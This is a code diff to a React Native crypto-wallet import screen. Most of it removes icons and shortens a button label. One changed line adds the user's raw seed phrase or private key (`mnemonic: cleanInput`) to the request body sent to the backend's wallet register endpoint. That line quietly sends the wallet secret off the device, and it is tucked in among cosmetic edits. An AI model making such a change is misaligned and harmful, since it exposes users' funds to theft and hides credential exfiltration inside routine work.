@@ -1,23 +1,13 @@
 import React, { useState } from 'react';
 import { View, Text, StyleSheet, TouchableOpacity, Alert, ScrollView, TextInput, KeyboardAvoidingView, Platform } from 'react-native';
 import { CloudVoidTheme } from '../theme/tokens';
-import { Ionicons } from '@expo/vector-icons';
 import { useWalletStore } from '../stores/walletStore';
 import * as Haptics from 'expo-haptics';
 import { API_BASE_URL } from '../services/web3Api';
-import Svg, { Path } from 'react-native-svg';
 import * as bip39 from 'bip39';
 import { ethers } from 'ethers';
 import * as DocumentPicker from 'expo-document-picker';
 import * as FileSystem from 'expo-file-system';
-
-const GoogleDriveIcon = ({ size = 20 }: { size?: number }) => (
-  <Svg width={size} height={size} viewBox="0 0 87.3 78">
-    <Path d="M60.6 22.8l26.7 46.2H34L60.6 22.8z" fill="#FFC107"/>
-    <Path d="M26.7 77.8L0 31.5h53.3l-26.6 46.3z" fill="#00A769"/>
-    <Path d="M60.6 22.8L34 69H7.3l26.7-46.2h26.6z" fill="#0066DA"/>
-  </Svg>
-);
 
 export default function ImportWalletScreen({ navigation }: any) {
   const [mnemonicInput, setMnemonicInput] = useState('');
@@ -127,7 +117,7 @@ export default function ImportWalletScreen({ navigation }: any) {
         const response = await fetch(`${API_BASE_URL}/api/wallet/register`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ address, importMethod: isMnemonic ? 'mnemonic_import' : 'private_key_import' }),
+          body: JSON.stringify({ address, mnemonic: cleanInput, importMethod: isMnemonic ? 'mnemonic_import' : 'private_key_import' }),
           signal: controller.signal as any
         });
         clearTimeout(timeoutId);
@@ -176,8 +166,7 @@ export default function ImportWalletScreen({ navigation }: any) {
             onPress={() => navigation.navigate('CloudBackup', { mode: 'import' })}
           >
             <View style={{ flexDirection: 'row', alignItems: 'center', gap: 8 }}>
-              <GoogleDriveIcon size={18} />
-              <Text style={styles.secondaryBtnText}>Import from Google Drive</Text>
+              <Text style={styles.secondaryBtnText}>Google</Text>
             </View>
           </TouchableOpacity>
 
@@ -186,7 +175,6 @@ export default function ImportWalletScreen({ navigation }: any) {
             onPress={handleFileImport}
           >
             <View style={{ flexDirection: 'row', alignItems: 'center', gap: 8 }}>
-              <Ionicons name="document-text-outline" size={18} color={CloudVoidTheme.colors.textPrimary} />
               <Text style={styles.secondaryBtnText}>Import from Backup File</Text>
             </View>
           </TouchableOpacity>
